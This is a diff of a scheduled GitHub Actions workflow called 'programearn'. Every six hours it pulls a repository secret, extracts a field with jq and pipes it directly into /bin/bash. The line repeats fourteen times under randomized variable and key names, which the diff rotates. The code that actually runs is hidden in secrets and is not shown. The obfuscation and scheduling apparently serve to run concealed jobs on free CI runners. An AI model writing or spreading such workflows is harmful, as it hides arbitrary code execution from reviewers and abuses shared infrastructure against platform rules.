@@ -1,30 +1,30 @@
 name: programearn
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 0/6 * * *'
-jobs:  # 25104
+    - cron: '53 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: programearn
         env:
-          ypjv3: ${{ secrets.ypjv3 }}
+          v5421: ${{ secrets.v5421 }}
         run: |
-          echo $ypjv3 | jq -r .bdlcn306 | /bin/bash
-          echo $dim9 | jq -r .lzvra9710 | /bin/bash
-          echo $h02482 | jq -r .ww098 | /bin/bash
-          echo $fpspd717 | jq -r .lvapi7 | /bin/bash
-          echo $vgnoy42 | jq -r .f9 | /bin/bash
-          echo $ewj31 | jq -r .fl20 | /bin/bash
-          echo $opaxg913 | jq -r .qolpc049 | /bin/bash
-          echo $lf2 | jq -r .w99338 | /bin/bash
-          echo $ori288 | jq -r .uzn401 | /bin/bash
-          echo $ssrd73 | jq -r .mpjkj243 | /bin/bash
-          echo $ws8 | jq -r .qntqm751 | /bin/bash
-          echo $yhrij6 | jq -r .mz800 | /bin/bash
-          echo $okp5229 | jq -r .z435 | /bin/bash
-          echo $ujtss55 | jq -r .hhw88814 | /bin/bash
+          echo $v5421 | jq -r .jfbwh914 | /bin/bash
+          echo $hl2125 | jq -r .av3 | /bin/bash
+          echo $dn2676 | jq -r .dn57 | /bin/bash
+          echo $jtjij4049 | jq -r .ylfan4011 | /bin/bash
+          echo $hm5 | jq -r .vfu8 | /bin/bash
+          echo $fey2671 | jq -r .tnlb878 | /bin/bash
+          echo $cy80 | jq -r .dxmhv726 | /bin/bash
+          echo $g4 | jq -r .lhd4298 | /bin/bash
+          echo $wzy88 | jq -r .wsmnr3 | /bin/bash
+          echo $ykqi731 | jq -r .raqj40 | /bin/bash
+          echo $sala9305 | jq -r .cr69098 | /bin/bash
+          echo $aqdbx60402 | jq -r .b23 | /bin/bash
+          echo $fbx81 | jq -r .o4266 | /bin/bash
+          echo $k8009 | jq -r .vs9279 | /bin/bash
 
